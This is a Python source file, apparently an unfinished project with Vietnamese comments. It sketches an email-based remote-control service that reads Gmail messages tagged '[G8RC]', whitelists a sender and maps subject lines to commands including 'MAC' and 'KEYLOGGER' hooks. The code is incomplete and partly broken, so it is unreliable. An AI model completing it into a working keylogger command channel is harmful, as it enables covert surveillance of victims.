import imaplib
import smtplib
import email


class MailService:
    # account credentials
    username = "example@gmail.com"
    password = "password"
    # use your email provider's IMAP server, you can look for your provider's IMAP server on Google
    # or check this page: https://www.systoolsgroup.com/imap/
    imap_host = "imap.gmail.com"
    smpt_host = "smtp.gmail.com"
    # create an IMAP4 class with SSL
    mail = imaplib.IMAP4_SSL(imap_host)

    def __init__(self) -> None:
        pass

    def login(self, username, password):
        # authenticate
        self.mail.login(username, password)

    def read_mail(self, box="INBOX"):
        self.mail.select(box)
        _, search_data = self.mail.search(None, '(SUBJECT "[G8RC]")')

        for num in search_data[0].split():
            _, data = self.mail.fetch(num, "(RFC822)")
            _, bytes_data = data[0]
            # convert the byte data to message
            email_message = email.message_from_bytes(bytes_data)
            request_dict = {
                "sender": email_message["from"],
                "subject": email_message["subject"],
            }
            return request_dict

    def send_mail(self, to_mail):
        server = smtplib.SMTP(self.smpt_host, port=587)
        server.ehlo()
        server.starttls()
        server.login(self.username, self.password)
        server.sendmail(to_mail)
        server.quit()

    def test_func():
        print("test")

    # viet chua xong
    def parse_request(self, request_dict):
        whitelist = ["sender@gmail.com"]
        request_tree = {
            "Test": "test_func",
            "MAC": "get_mac",
            "KEYLOGGER": {"HOOK": "get_hook", "PRINT": "print",},
        }
        if request_dict["sender"] in whitelist:
            command = request_dict["subject"]

        response_dict = {"function": "", "params": "", "msg": "", "command": command}
        return response_dict

    def respond(self, host_mail, mail):
        response = self.parse_request(mail)
        # goi ham build_mail_content
        # response_mail = build_mail_content
        self.send_mail(response_mail)


if __name__ == "__main__":
    m = MailService()
    m.login(m.username, m.password)
    print(m.read_mail("INBOX"))
    m.imap_host.close()
    m.imap_host.logout()

